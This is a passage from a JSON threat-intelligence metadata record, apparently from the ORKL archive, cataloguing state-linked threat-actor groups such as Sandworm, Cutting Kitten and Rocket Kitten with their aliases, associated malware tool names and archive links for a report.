            "aliases": [],
            "source_name": "ETDA:Sima",
            "tools": [
                "Luminosity RAT",
                "LuminosityLink",
                "Sima"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f763fd1f-f697-40eb-a082-df6fd3d13cb1",
            "created_at": "2023-01-06T13:46:38.561288Z",
            "updated_at": "2025-03-27T02:00:02.861874Z",
            "deleted_at": null,
            "main_name": "Infy",
            "aliases": [
                "Operation Mermaid",
                "Prince of Persia",
                "Foudre"
            ],
            "source_name": "MISPGALAXY:Infy",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "217c588a-5896-4335-b9ec-a516ae2f9a7e",
            "created_at": "2022-10-25T16:07:23.513775Z",
            "updated_at": "2025-03-27T02:02:09.838687Z",
            "deleted_at": null,
            "main_name": "Cutting Kitten",
            "aliases": [
                "Cutting Kitten",
                "Operation Cleaver",
                "TG-2889"
            ],
            "source_name": "ETDA:Cutting Kitten",
            "tools": [
                "CsExt",
                "DistTrack",
                "IvizTech",
                "Jasus",
                "KAgent",
                "Logger Module",
                "MANGOPUNCH",
                "MPK",
                "MPKBot",
                "Net Crawler",
                "NetC",
                "PVZ-In",
                "PVZ-Out",
                "Pupy",
                "PupyRAT",
                "PvzOut",
                "Shamoon",
                "SynFlooder",
                "SysKit",
                "TinyZBot",
                "WndTest",
                "pupy",
                "zhCat",
                "zhMimikatz"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b0261705-df2e-4156-9839-16314250f88a",
            "created_at": "2023-01-06T13:46:38.373617Z",
            "updated_at": "2025-03-27T02:00:02.817313Z",
            "deleted_at": null,
            "main_name": "Rocket Kitten",
            "aliases": [
                "Operation Woolen-Goldfish",
                "Thamar Reservoir",
                "Timberworm",
                "TEMP.Beanie",
                "Operation Woolen Goldfish"
            ],
            "source_name": "MISPGALAXY:Rocket Kitten",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
            "created_at": "2023-01-06T13:46:38.376868Z",
            "updated_at": "2025-03-27T02:00:02.818071Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Cobalt Gypsy",
                "G0003",
                "Operation Cleaver",
                "Op Cleaver",
                "Tarh Andishan",
                "Alibaba",
                "TG-2889"
            ],
            "source_name": "MISPGALAXY:Cleaver",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "eeb03ad7-d11f-4600-a587-b7c86aa38e5f",
            "created_at": "2023-01-06T13:46:38.564888Z",
            "updated_at": "2025-03-27T02:00:02.862675Z",
            "deleted_at": null,
            "main_name": "Sima",
            "aliases": [],
            "source_name": "MISPGALAXY:Sima",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7bd810cb-d674-4763-86eb-2cc182d24ea0",
            "created_at": "2022-10-25T16:07:24.1537Z",
            "updated_at": "2025-03-27T02:02:10.126127Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "APT 44",
                "ATK 14",
                "BE2",
                "Blue Echidna",
                "CTG-7263",
                "FROZENBARENTS",
                "IRIDIUM",
                "Iron Viking",
                "Quedagh",
                "Sandworm",
                "Sandworm Team",
                "Seashell Blizzard",
                "TEMP.Noble",
                "UAC-0082",
                "UAC-0113",
                "UAC-0125",
                "UAC-0133",
                "Voodoo Bear"
            ],
            "source_name": "ETDA:Sandworm Team",
            "tools": [
                "AWFULSHRED",
                "ArguePatch",
                "BIASBOAT",
                "Black Energy",
                "BlackEnergy",
                "CaddyWiper",
                "Colibri Loader",
                "Cyclops Blink",
                "CyclopsBlink",
                "DCRat",
                "DarkCrystal RAT",
                "Fobushell",
                "GOSSIPFLOW",
                "Gcat",
                "IcyWell",
                "Industroyer2",
                "JaguarBlade",
                "JuicyPotato",
                "Kapeka",
                "KillDisk.NCX",
                "LOADGRIP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "ORCSHRED",
                "P.A.S.",
                "PassKillDisk",
                "Pitvotnacci",
                "PsList",
                "QUEUESEED",
                "RansomBoggs",
                "RottenPotato",
                "SOLOSHRED",
                "SwiftSlicer",
                "VPNFilter",
                "Warzone",
                "Warzone RAT",
                "Weevly"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716494,
    "ts_updated_at": 1743041825,
    "ts_creation_date": 0,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/12503011cfce27ed282658baa893fa8791d27965.pdf",
        "text": "https://archive.orkl.eu/12503011cfce27ed282658baa893fa8791d27965.txt",
        "img": "https://archive.orkl.eu/12503011cfce27ed282658baa893fa8791d27965.jpg"
    }
}